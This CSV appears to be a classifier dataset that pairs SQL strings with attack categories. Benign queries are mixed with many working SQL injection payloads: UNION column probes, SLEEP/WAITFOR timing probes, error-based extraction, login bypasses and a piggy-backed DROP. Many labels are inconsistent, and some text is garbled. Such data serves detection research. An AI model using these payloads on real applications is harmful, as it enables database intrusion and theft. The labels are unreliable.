knownpatterns,category
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",Union Query
SELECT Count ( * )  AS shelf,Illegal/Logically incorrect query
SELECT * FROM bottom ORDER BY thou,Tautology
""" SELECT column_name ( s )  FROM vowel,softly""",Tautology
"""   SELECT world, dress, killFROM station WHERE letter  IS NOT NULL""",Tautology
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',Tautology
SELECT * FROM tall  WHERE hung = brief,Tautology
"""1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz""",Illegal/Logically incorrect query
SELECT * FROM person ORDER BY necessary DESC,Tautology
"""   SELECT COUNT ( notice ) , carried FROM lay BY modern""",Illegal/Logically incorrect query
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- ",Union Query
"""1""""""""  (  .'.  (  ,  (  .""",Tautology
SELECT * FROM without WHERE car = 'especially'  OR tears = 'southern',Tautology
"""1""""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   """"mjkl""""  =  """"mjkl""",Tautology
1'||  (  select 'lljg' from dual where 7631=  7631,Tautology
"""-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#""",Union Query
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28547 )  ORDER BY meta_id ASC""",Tautology
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,Tautology
SELECT * FROM sail WHERE have NOT BETWEEN 'people' AND 'form',Tautology
%' AND 8310=8310 AND '%'=',Tautology
"""1""""   )    )    as esho where 8864  =  8864 order by 1--""",Tautology
"""   SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth""",Tautology
SELECT * FROM  ( SELECT zebra FROM does ) ,Tautology
SELECT * FROM OrdersWHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,Tautology
"""1%""""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,Tautology
1' and 7533  =  7533 and 'clqy' like 'clqy,Tautology
"""  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  """,Alternate Encoding
SELECT * FROM border  WHERE mighty = shallow,Tautology
"""1""""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
SELECT * FROM individual WHERE    NOT post = 'horn',Tautology
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%',Tautology
""" SELECT * FROM course ORDER BY compass ASC, board DESC""",Tautology
SELECT COUNT ( plates ) FROM needed,Illegal/Logically incorrect query
"""1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --""",Union Query
"admin"") or (""1""=""1""#",Tautology
"""1""""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  """"dwpa""""  =  """"dwpa""",Tautology
"""  (  select   (  case when   (  1343=1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  """,Illegal/Logically incorrect query
"""1%""""  )   or extractvalue  (  1297,concat  (  0x5cx7171706a71,  (  select   (  elt  (  1297=1297   )    )     )  x717a767a71   )    )    and   (  """"%""""  =  """"""",Alternate Encoding
SELECT * FROM dot WHERE hungry = 'threw',Tautology
1  )   waitfor delay '0:0:5'--,Time-based Query
"""  SELECT Orders.zerorID, Employees.as, Employees.fireplace FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.solidID ORDER BY Orders.structureID""",Tautology
1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,Time-based Query
1 or sleep(5)#,Time-based Query
SELECT DISTINCT bare FROM fun,Tautology
SELECT realize FROM thrown UNION ALL SELECT full FROM of ORDER BY friendly,Union Query
SELECT TOP 3 * FROM themselves WHERE principal = 'art' SELECT * FROM across,Tautology
"""1%'   )    )     )   union all select null,null,null,null#""",Union Query
"""1""""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   """"vlev"""" like """"vlev""",Illegal/Logically incorrect query
SELECT AVG ( past ) FROM hall SELECT SUM ( property ) ,Illegal/Logically incorrect query
"""1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
select   (  case when   (  2161=  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,Tautology
SELECT * FROM  ( SELECT state FROM path ) ,Tautology
SELECT television ( s )  FROM bill SELECT transportation ( s ) ,Tautology
"""1'   )    )    as wves where 2641=  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #""",Alternate Encoding
waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,Time-based Query
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,Tautology
SELECT AVG ( Price ) FROM red,Illegal/Logically incorrect query
SELECT * FROM here WHERE cap NOT LIKE '[sentence]%',Tautology
"""-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #""",Illegal/Logically incorrect query
SELECT * FROM blanket WHERE remember BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  ) """,Tautology
"""select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  """"%""""  =  """"""",Alternate Encoding
SELECT * FROM since WHERE think BETWEEN 'friend' AND 'gradually',Tautology
SELECT TOP 3 * FROM herd,Tautology
-3582  )   where 5873  =  5873 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,Tautology
"""  SELECT REPEAT ( """"SQL Tutorial"""", 3 ) ;""",Tautology
"""1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod""",Tautology
"""1"""" and elt  (  8464  =  5761,5761  )   and """"ydmt"""" like """"ydmt""",Tautology
SELECT * FROM tape,Tautology
"""-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570=1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup""",Alternate Encoding
- 1468'   )    )     )   or 4875  =  6163#,Tautology
"""- 1597"""" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--""",Union Query
"""  SELECT Orders.mirrorrID, Employees.storm, Employees.still FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.landID ORDER BY Orders.certainlyID""",Tautology
SELECT COUNT ( helloID ) FROM wall,Illegal/Logically incorrect query
SELECT * FROM differ WHERE breeze = 'another'  AND City = 'detail',Tautology
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,Piggy-Backed Query
or a=a,Tautology
"""1'   )    )    and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )    and    (    (   'mexd' like 'mexd""",Alternate Encoding
"""1"""" where 2512  =  2512 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
"""1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '""",Illegal/Logically incorrect query
"""-6112""""  )   union all select 8203,8203,8203,8203,8203,8203,8203--""",Union Query
"""- 1628"""" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--""",Union Query
"""-3420 where 9681=  9681 or make_set  (  2438=1977977  )  --""",Tautology
SELECT * FROM stepped FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM support,Tautology
""" SELECT * FROM equipment ORDER BY rhythm, least""",Tautology
"""  SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight""",Union Query
'%20'HERP,Tautology
SELECT * FROM rush 3 SELECT * FROM anyway,Tautology
"""1""""  )   where 5828  =  5828 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
"""waitfor delay '0:0:5' and    (    (     (  """"%""""  =  """"""",Time-based Query
SELECT * FROM fly WHERE trace = 'rubbed',Tautology
"""1"""" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and """"oyou""""  =  """"oyou""",Alternate Encoding
SELECT rose FROM muscle UNION SELECT tiny FROM our ORDER BY helpful,Union Query
"""1'  )   and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )   and   (  'dtym'  =  'dtym""",Alternate Encoding
1' where 7036  =  7036,Tautology
SELECT * FROM crew ORDER BY group DESC,Tautology
"""1  )   union all select null,null--""",Union Query
"""-8065""""   )    )     )   order by 1--""",Tautology
-9264'  )   or 8571=  8571--,Tautology
SELECT AVG ( bat ) FROM earn,Illegal/Logically incorrect query
"""  SELECT occasionally,younger FROM mass WHERE thou = 'trip' UNION SELECT stretch, engineer FROM certain""",Union Query
SELECT * FROM sharp WHERE cool = 'start' LIMIT 3,Tautology
"""1' where 6721=  6721 union all select null,null,null,null,null,null,null,null,null,null#""",Union Query
""" SELECT * FROM doubt ORDER BY key, east""",Tautology
ORDER BY 6#,Tautology
"""   SELECT Employees.regular, COUNT ( Orders.mountainID )  AS flagFROM    ( OrdersINNER JOIN lips ON Orders.gladID  =  Employees.plusID ) """,Illegal/Logically incorrect query
"""-6014"""" or make_set  (  3003  =  2609,2609  )  """,Tautology
admin' --,Tautology
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- ",Union Query
1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,Time-based Query
"""   SELECT hidden, slabs, salt FROM trick WHERE sugar  IS NULL""",Tautology
"""  SELECT * FROM examine WHERE hello IN  ( 'shoot', 'happy', 'ball' )  """,Illegal/Logically incorrect query
SELECT Count ( * )  AS consonant,Illegal/Logically incorrect query
SELECT hay ( s )  FROM congress UNION,Union Query
 UPDATE serve SET official = 'colony'WHERE labor = 'dark',Tautology
-5369'  )   or 3208  =  6669#,Tautology
"""1"""" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and """"lgwe"""" like """"lgwe""",Tautology
SELECT COUNT ( DISTINCT weight )  FROM quickly,Illegal/Logically incorrect query
SELECT * FROM fell WHERE adjective = 'several',Tautology
1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,Time-based Query
"""1%"""" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT * FROM shelf WHERE sometime  BETWEEN 10 AND 20,Tautology
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- ",Union Query
SELECT street ( s )  FROM pupil SELECT concerned ( s ) ,Tautology
"""1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045=1045   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294""",Union Query
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260=1260,Tautology
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20,Tautology
ORDER BY 28#,Tautology
"""1"""" where 2235  =  2235 union all select null,null,null,null,null--""",Union Query
1'||  (  select 'mwpd' where 2887  =  2887,Tautology
"""waitfor delay '0:0:5' and    (    (     (  """"mfro"""" like """"mfro""",Time-based Query
ÃƒÂ½ or 1=1 --,Tautology
"""-3377""""  )   or 4982  =  6608#""",Tautology
SELECT COUNT ( made ) FROM promised,Illegal/Logically incorrect query
1'  )   where 9817  =  9817,Tautology
"""-2276""""   )    )    as qwow where 2321=  2321 or 3534  =  2971--""",Tautology
SELECT * FROM sudden ORDER BY useful,Tautology
SELECT * FROM fierce WHERE get = 'gold' FETCH FIRST 3 ROWS ONLY,Tautology
SELECT COUNT ( worthID ) FROM mirror,Illegal/Logically incorrect query
SELECT column_name ( s )  FROM table1 UNION ALL,Union Query
"""1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )  """,Stored Procedure
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,Illegal/Logically incorrect query
""""""" or sleep  (  __TIME__  )    =  """"""",Time-based Query
ORDER BY 16#,Tautology
SELECT mice ( s )  FROM winter,Alternate Encoding
SELECT TOP 3 * FROM opportunity WHERE finest = 'dawn',Tautology
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28635 )  ORDER BY meta_id ASC""",Tautology
"""1'   )    )     )   and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )   and    (    (     (  'vfnl'  =  'vfnl""",Alternate Encoding
"""1"""" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  """,Illegal/Logically incorrect query
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',Tautology
"""1""""  )   where 1330=1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --""",Time-based Query
"""-7793""""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  """"lias""""  =  """"lias""",Tautology
"""a"""" or 3=3--""",Tautology
SELECT DISTINCT badly FROM pot,Tautology
"""1%""""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #""",Alternate Encoding
"""1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'""",Illegal/Logically incorrect query
1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,Tautology
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262327 )  ORDER BY meta_id ASC""",Tautology
select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,Alternate Encoding
 UPDATE drink SET ability = 'court'WHERE twice = 'union',Union Query
SELECT ISNULL ( 350 ) ;,Tautology
 (  case when 6398  =  6398 then 1 else null end  ) ,Tautology
' or uname like '%,Tautology
SELECT * FROM feathers,Tautology
SELECT MIN ( according )  AS brain FROM eager,Illegal/Logically incorrect query
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",Union Query
end and    (    (     (  'hglq' like 'hglq,Tautology
SELECT COUNT ( surfaceID ) FROM mine,Illegal/Logically incorrect query
" UNION SELECT @@VERSION,SLEEP(5),USER(),4",Union Query
"""-8353'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ptlz'  =  'ptlz""",Tautology
SELECT * FROM  ( SELECT tape FROM practice ) ,Tautology
"""1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'""",Alternate Encoding
"""1%""""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
"""1""""   )    )    union all select null,null,null--""",Union Query
"""1"""" and 4241=  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241=  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and """"endx""""  =  """"endx""",Alternate Encoding
"""  SELECT Orders.streamrID, Employees.run, Employees.wear FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.catID ORDER BY Orders.unusualID""",Tautology
SELECT TOP 3 * FROM add SELECT * FROM small 3SELECT * FROM talk,Tautology
"""  SELECT LEAST ( 3, 12, 34, 8, 25 ) ;""",Tautology
"""1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf""",Union Query
SELECT nice FROM arrive UNION ALL SELECT enemy FROM immediately ORDER BY such,Union Query
SELECT end FROM funny,Tautology
"""1' and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )    and 'pphf'  =  'pphf""",Alternate Encoding
SELECT * FROM attention WHERE effort = 'does'  OR everything = 'allow',Tautology
SELECT * FROM likely ORDER BY common DESC,Tautology
SELECT * FROM adventure FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM education,Tautology
SELECT TOP 50 PERCENT * FROM box SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chemical,Tautology
SELECT COUNT ( wonder ) FROM use,Illegal/Logically incorrect query
ORDER BY 27#,Tautology
SELECT COUNT ( particularlyID ) FROM bee,Illegal/Logically incorrect query
SELECT * FROM cage WHERE carbon LIKE '%pen%',Tautology
SELECT TOP 50 PERCENT * FROM coming SELECT * FROM location FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM found,Illegal/Logically incorrect query
SELECT AVG ( Price ) FROM attack,Illegal/Logically incorrect query
SELECT * FROM give WHERE ability NOT LIKE '[dropped]%',Piggy-Backed Query
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former',Tautology
SELECT AVG ( upper ) FROM turn SELECT SUM ( pull ) ,Illegal/Logically incorrect query
SELECT * FROM silence 3 SELECT * FROM dozen,Tautology
"""-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696""",Tautology
"""1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf""",Illegal/Logically incorrect query
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ) ,Tautology
"""1'  )   or updatexml  (  1808,concat  (  0x2ex7171706a71,  (  select   (  elt  (  1808=1808   )    )     )  x717a767a71  )  ,8666  )  """,Alternate Encoding
"""1"""" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  """,Illegal/Logically incorrect query
""" select * from users where id=1 *$ . union select null,@@VERSION -- 1""",Union Query
SELECT * FROM bit WHERE sport NOT BETWEEN 'frog' AND 'cattle',Tautology
SELECT vessels FROM of,Tautology
"""-4711%""""   )    )    union all select 6737,6737,6737,6737#""",Union Query
"""1%""""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #""",Time-based Query
SELECT * FROM tears WHERE which BETWEEN stiff09/01/1996report AND pride15/31/1996bare,Tautology
SELECT * FROM carbon WHERE indicate = 'paragraph' FETCH FIRST 3 ROWS ONLY,Tautology
"""select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph""",Illegal/Logically incorrect query
"""1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045=1045   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx""",Union Query
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
""" SELECT * FROM exactly ORDER BY part, gray""",Tautology
"""1""""   )    )     )   or extractvalue  (  1297,concat  (  0x5cx7171706a71,  (  select   (  elt  (  1297=1297   )    )     )  x717a767a71   )    )    and    (    (     (  """"dzse""""  =  """"dzse""",Alternate Encoding
select sleep  (  5  )  -- hlgt,Time-based Query
-9024  )   where 1686=1686 or 3069  =  8213--,Tautology
"""  SELECT * FROM harbor WHERE butter IN  ( 'correct', 'gain', 'load' )  """,Tautology
or 1=1--,Tautology
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,Tautology
1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,Tautology
-8636'   )    )     )   or 4301=  7212--,Tautology
"""1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'""",Illegal/Logically incorrect query
SELECT lion ( s )  FROM scale SELECT figure ( s ) ,Tautology
"""  SELECT Orders.tobaccorID, Employees.single, Employees.die FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whoseID ORDER BY Orders.bottleID""",Tautology
-2527   )    )    as oqpy where 7468  =  7468 or 3038  =  3038,Tautology
"select * from users where id=1 or \.<$ or 1=1-- 1""",Tautology
"""   SELECT recently,running,light,house,birth     (  (  onto JOIN nodded ON animal.held =  arrive.whom )   INNER JOIN olderON Orders.allow =  pair.awayID ) """,Tautology
"""1""""  )   where 7753  =  7753""",Tautology
SELECT * FROM local WHERE    NOT winter = 'region',Alternate Encoding
SELECT skill ( s )  FROM worse UNION,Union Query
"""1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--""",Union Query
ORDER BY SLEEP(5),Time-based Query
SELECT * FROM amount WHERE part BETWEEN 'grandmother' AND 'card',Tautology
"""select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--""",Tautology
"""  SELECT RTRIM ( """"SQL TutorialÃ‚Â Ã‚Â Ã‚Â Ã‚Â  """" )  AS RightTrimmedString; """,Tautology
SELECT * FROM  ( SELECT start FROM cowboy ) ,Tautology
"""1%' union all select null,null,null--""",Union Query
"""1"""" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #""",Time-based Query
ORDER BY 31337--,Tautology
1  )   as vqdh where 1603=1603,Tautology
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,Time-based Query
SELECT * FROM southern WHERE should NOT LIKE 'ourselves%',Tautology
"""   SELECT writing, tea, heldFROM forest WHERE swung  IS NOT NULL""",Tautology
SELECT knew ( s FROM belong RIGHT JOIN,Tautology
"""1'  )   where 5799  =  5799 union all select null,null,null,null,null--""",Union Query
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,Alternate Encoding
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
"select * from users where id  =  '1' or \<1 or 1=1-- 1""'",Tautology
select   (  case when   (  8841=  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,Alternate Encoding
SELECT SUM ( Quantity )  FROM OrderDetails;,Illegal/Logically incorrect query
SELECT COUNT ( him ) FROM doing,Illegal/Logically incorrect query
SELECT * FROM difficult WHERE sick LIKE '%serve%',Tautology
"""   SELECT cent, cool, bareFROM anybody WHERE drop  IS NOT NULL""",Piggy-Backed Query
SELECT * FROM  ( SELECT hour FROM indicate ) ,Tautology
SELECT * FROM  ( SELECT fur FROM stared ) ,Tautology
SELECT * FROM Customers WHERE ROWNUM < =  3;,Tautology
1'+  (  select snam where 1993=1993,Tautology
"""1""""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  """"rkry"""" like """"rkry""",Alternate Encoding
